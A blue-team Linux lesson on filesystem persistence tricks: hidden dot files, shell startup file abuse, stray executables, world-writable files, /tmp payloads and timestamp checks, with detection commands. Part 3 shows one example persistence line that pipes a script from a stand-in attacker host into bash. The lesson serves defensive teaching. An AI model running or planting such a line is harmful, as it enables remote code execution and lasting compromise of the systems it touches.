# 🐧 LINUX MASTERY

## LESSON 14: FILESYSTEM ABUSE & PERSISTENCE TRICKS (BLUE TEAM)

> Attackers don’t always create users.
> Sometimes they **hide inside the filesystem**.

This lesson covers how attackers persist using files, permissions, and startup abuse — and how Blue Team detects it.

---

## PART 1️⃣ WHY FILESYSTEM ABUSE MATTERS

Attackers abuse the filesystem to:

* survive reboots
* avoid detection
* blend in with normal files
* regain access later

Blue Team must know **where attackers hide and why**.

---

## PART 2️⃣ HIDDEN FILES & DIRECTORIES

---

### 🔹 Hidden files (dot files)

Any file starting with `.` is hidden by default.

Examples:

```text
.bashrc
.profile
.ssh
.cache
```

---

### 🔹 Show hidden files

```bash
ls -la
```

📌 SOC analysts always use `ls -la`, never plain `ls`.

---

🚨 **Attacker trick**

Attackers create files with innocent-looking names:

```text
.backup
.update
.config
```

They appear harmless but may execute malicious code.

---

## PART 3️⃣ SHELL STARTUP FILE ABUSE (CRITICAL)

---

### 🔹 Startup files

These run automatically when a shell starts:

```text
~/.bashrc
~/.profile
~/.bash_profile
```

---

🚨 **Attacker abuse**

Attackers add malicious commands such as:

```bash
curl attacker.com/shell.sh | bash
```

Every login triggers execution.

---

📌 **Blue Team check**

```bash
cat ~/.bashrc
```

Look for:

* unknown commands
* `curl` / `wget`
* encoded or obfuscated strings

---

## PART 4️⃣ PERMISSIONS ABUSE

---

### 🔹 Executable permission misuse

Find executable files:

```bash
find / -type f -perm /111 2>/dev/null
```

---

🚨 **Attacker trick**

Executables placed in unusual locations:

```text
/tmp/.x
/var/tmp/update
/home/user/.cache/run
```

---

📌 **Blue Team rule**

Executables should normally live in:

```text
/bin
/usr/bin
/usr/local/bin
```

---

## PART 5️⃣ WORLD-WRITABLE FILES (DANGEROUS)

---

### 🔹 World-writable permissions

Anyone can modify the file.

Example:

```text
-rwxrwxrwx
```

---

### 🔹 Find world-writable files

```bash
find / -type f -perm -002 2>/dev/null
```

🚨 Attackers inject code into these files.

---

## PART 6️⃣ TEMP DIRECTORY ABUSE

---

### 🔹 `/tmp` and `/var/tmp`

These directories are:

* writable by everyone
* commonly ignored

---

🚨 **Attacker behavior**

* drop payloads
* execute from `/tmp`
* hide malicious files

---

📌 **Blue Team checks**

```bash
ls -la /tmp
```

Look for:

* hidden files
* executable permissions
* recent timestamps

---

## PART 7️⃣ FILE TIMESTAMPS (FORENSICS BASIC)

---

### 🔹 File timestamps

Linux tracks:

* access time (atime)
* modification time (mtime)
* change time (ctime)

---

### 🔹 View timestamps

```bash
stat filename
```

📌 Sudden or mismatched timestamps are suspicious.

---

## PART 8️⃣ COMMON FILESYSTEM RED FLAGS

🚨 Indicators of compromise:

* executables in `/tmp`
* hidden files in home directories
* modified `.bashrc`
* world-writable sensitive files
* binaries outside standard paths

---

## PART 9️⃣ BLUE TEAM INVESTIGATION FLOW

1️⃣ List files:

```bash
ls -la
```

2️⃣ Check startup scripts:

```bash
cat ~/.bashrc
```

3️⃣ Find executables:

```bash
find / -perm /111
```

4️⃣ Inspect timestamps:

```bash
stat suspicious_file
```

---

## PART 🔟 SAFE RULES

❌ Do NOT execute suspicious files
❌ Do NOT delete immediately

✔️ Observe
✔️ Hash files
✔️ Escalate findings

---

## PART 1️⃣1️⃣ SUMMARY TABLE

| Technique      | Command           |
| -------------- | ----------------- |
| Hidden files   | `ls -la`          |
| Startup abuse  | `cat ~/.bashrc`   |
| Executables    | `find -perm /111` |
| World-writable | `find -perm -002` |
| Timestamps     | `stat`            |

---

> 🛡️ **If malware survives logout,**
> it usually lives in **files, permissions, or startup scripts**.
